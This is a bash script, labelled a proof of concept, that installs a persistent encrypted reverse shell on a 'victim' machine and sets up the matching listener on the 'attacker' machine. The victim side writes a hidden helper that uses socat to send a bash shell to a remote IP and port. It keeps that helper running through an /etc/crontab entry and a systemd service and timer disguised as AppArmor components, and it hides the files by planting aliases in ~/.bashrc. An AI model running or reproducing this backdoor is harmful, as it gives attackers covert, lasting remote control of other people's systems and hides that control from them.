#!/bin/bash

## Version: v3.6
## Autor: BeeMo
## Purpose: This script is a PoC of how an attacker could maintain persistence on
## 	    a compromised machine and at the same time encrypt his communications in
##	    order to reduce his network fingerprint.

## v3.5: server-side configuration and trying to hide to the user the presence
##		  of this script on his system.

## v3.6: added stealth to the script by hiding the content of /etc/crontab by adding aliases
##	added daemonSetup to not depend on crontab for persistency

## This script creates the SSL certificates and uses crontab to setup a cron task
## where lately, using socat, sends the victims shell to the attacker's  remoteIP:remotePort
## supplied as arguments.





## Functions: checkDependencies(), getVars(), attackerSetup(), victimSetup() ##

## SCRIPT FUNCTIONS ##
function checkDependencies {
	## Check for dependencies
        	echo -e "[\e[1m\e[33m?\e[0m] Checking dependencies..."
                for dependency in Socat Crontab Cron Openssl
                do
                        which ${dependency,} 2>&1 1>/dev/null
                        if [ $? == 0 ]
                        then
                                echo -e "[\e[1m\e[32m+\e[0m] $dependency installed!"
                        else
                                read -p "[\e[1m\e[31m-\e[0m] $dependency not found.\nWould you like to install it? [y/n]: " yn
                                if [ $yn == "y" ]
                                then
                                        echo -e "[\e[1m\e[32m+\e[0m] Installing $dependency..."
                                        apt install -y ${dependency,} 2&>1 1>/dev/null
                                        if [ $? == 0 ]
                                        then
                                                echo -e "[\e[1m\e[32m+\e[0m] $dependency installation succeed!"
                                        else
                                                echo -e "[\e[1m\e[31m-\e[0m] I've found and error, $dependency haven't been installed..."
                                                exit 1
                                        fi
                                else
                                        echo -e "[\e[1m\e[34m!\e[0m] $dependency is required for this script to work!\nExiting..."
                                        exit 1
                                fi
                        fi
                done
        }


	function checkArgs {

		if [ -n "$2" ] && [ $(($2)) -ge 1 ] && [ $(($2)) -le 65535 ]
		then
			echo 2


		elif [ -n "$1" ] && [ $(($1)) -ge 1 ] && [ $(($1)) -le 65535 ]
		then
			echo 1

		else
			echo -e "[\e[1m\e[31m-\e[0m] No args supplied.\nExiting..."
			exit 1
		fi
	}


	## UNUSED FUNCTION ##
        function getVars {

                ## Port and IP are loaded from a user input.
                read -p "Insert the desired IP Address [ex. xxx.xxx.xxx.xxx]: " ip
                read -p "Insert the desired Port [range. 1-65535]: " port
        }
	## UNUSED FUNCTION ##

        function attackerSetup {

                ## SSL cert creation with openssl
                if [ ! -e $(pwd)/SSL.pem ]
                then
                        echo -e "[\e[1m\e[32m+\e[0m] Generating SSL pair of Key and Certificate..."
                        openssl req -newkey rsa:2048 -nodes -keyout key -x509 -days 360 -out cert 2>/dev/null << EOF
ES
Catalonia
Barcelona
N/A
N/A
N/A
N/A
EOF

                        ## Merges key and cert as required by Socat
                        echo -e "[\e[1m\e[32m+\e[0m] Merging SSL Key and Cert"
                        cat key cert > SSL.pem
                        rm key cert
                        echo -e "[\e[1m\e[32m+\e[0m] SSL.pem Created Succesfully!"
                else
                        echo -e "[\e[1m\e[34m!\e[0m] SSL.pem already created, using it for setup"
                fi

                socat -d -d OPENSSL-LISTEN:$1,cert=SSL.pem,verify=0,fork STDOUT
        }


        function victimSetup {
                ## Creating the script to be executed lately by cron
                echo -e "[\e[1m\e[32m+\e[0m] Generating Crontab script..."
                echo -e "#!/bin/bash\n" \
			"socat OPENSSL:$1:$2,verify=0 EXEC:/bin/bash &\n" > .appArmorHelper.sh
		chmod 400 .appArmorHelper.sh
                ## Adding execution privileges for root

                ## Adding cron job to /etc/crontab file
		if [ $(id -u) == 0 ]
		then
			cronJob="* *   * * *  root    $(pwd)/.appArmorHelper.sh"
	                # crontab -u root - < echo -e $cronJob
			echo -e "$cronJob" >> /etc/crontab

			### UNCOMMENT THIS LINE TO CHECK HOW THE SCRIPT EFFECTIVELY OVERWRITE /etc/crontab FILE ###
			#cat /etc/crontab
			### UNCOMMENT THIS LINE TO CHECK HOW THE SCRIPT EFFECTIVELY OVERWRITE /etc/crontab FILE ###

		else
			echo -e "[\e[1m\e[31m-\e[0m] Failed creating persistency, requires root!"
		fi
        }

	function stayStealthy {
		## Hides the presistency of the backdoor with a simple alias
		hiddenFileContent="alias cat='cat $1 | grep -v .appArmorHelper.sh' | grep -v cat | grep -v ls | grep -v ls"
		hiddenDaemon="alias ls='ls | grep -v AppArmorDepend'"
		hiddenAlias="alias alias='alias | grep -v cat | grep -v ls | grep -v alias'"

		$(unalias cat ls alias) 2>/dev/null
		sed "s/alias ls//g" ~/.bashrc

		mv ~/.bashrc ~/.bashrc2
		echo $hiddenFileContent >> ~/.bashrc
		echo $hiddenDaemon >> ~/.bashrc
		echo $hiddenAlias >> ~/.bashrc
		cat ~/.bashrc2 >> ~/.bashrc
		rm ~/.bashrc2
		source ~/.bashrc
	}

	function persistencyDaemonSetup {
		# Crea un demoni de tipus .service i de tipus .timer per a encryptedShellv3.5.sh


		echo -e "[Unit]\n" \
		        "Description=This service runs with AppArmor to garanty system security\n\n" \
		        "[Service]\n" \
		        "Type=oneshot\n" \
		        "ExecStart='/bin/bash $(pwd)/.appArmorHelper.sh'" > /etc/systemd/system/AppArmorDepend.service

		echo -e "[Unit]\n" \
		        "Description=This AppArmor helper runs every minute to detect filesystem changes\n\n" \
		        "[Timer]\n" \
		        "OnCalendar=*:0/1\n\n" \
		        "[Install]\n" \
		        "WantedBy=timers.target" > /etc/systemd/system/AppArmorDepend.timer
	}

## SCRIPT FUNCTIONS ##


## MAIN SCRIPT ##


## If user didn't pass any args, show usage.

if [ $# -le 1 ]
then
       	echo -e "\nUSAGE:\n" \
                "This script requires the following arguments: " \
                " ./ecryptedShellSetupv2.0.sh {victim/attacker}\n" \
                "\n" \
                "Modes: victim: Sets up the configuration on the victim PC.\n" \
		"	Example: ./encryptedShellSetupv2.0.sh victim {remoteIP} {remotePort}\n" \
		"	**DISCLAIMER**: victim requires sudo to setup persistency!\n\n" \
                "       attacker: Sets up the configuration on the attacker PC.\n" \
		"	Example: ./encryptedShellSetupv2.0.sh attacker {localPort}\n\n" \
                "For further details review the script as its well documented.\n"
	exit 1
else

	## Checks args and dependencies.
	returnedVal=$(checkArgs $2 $3)
	checkDependencies
	echo -e

	if  [ ${1,,} == "victim" ] && [ "$returnedVal" == "2" ]
	then
		victimSetup $2 $3
		persistencyDaemonSetup
		stayStealthy
	elif [ ${1,,} == "attacker" ] && [ "$returnedVal" == "1" ]
	then
		attackerSetup $2
	else
		echo -e "[\e[1m\e[31m-\e[0m] Invalid or missing arguments found."
		exit 1
	fi
fi

## MAIN SCRIPT ##
